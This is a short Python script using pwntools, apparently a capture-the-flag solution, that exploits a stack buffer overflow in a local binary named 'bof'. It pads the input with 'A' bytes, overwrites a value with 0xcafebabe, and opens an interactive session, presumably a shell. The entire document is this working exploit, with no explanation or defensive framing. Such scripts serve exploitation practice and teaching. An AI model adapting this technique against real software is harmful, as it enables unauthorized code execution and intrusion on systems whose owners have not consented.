from pwn import *

p = process('./bof')
payload = b"A"*(0x2c+8) + p32(0xcafebabe)
p.sendline(payload)
p.interactive()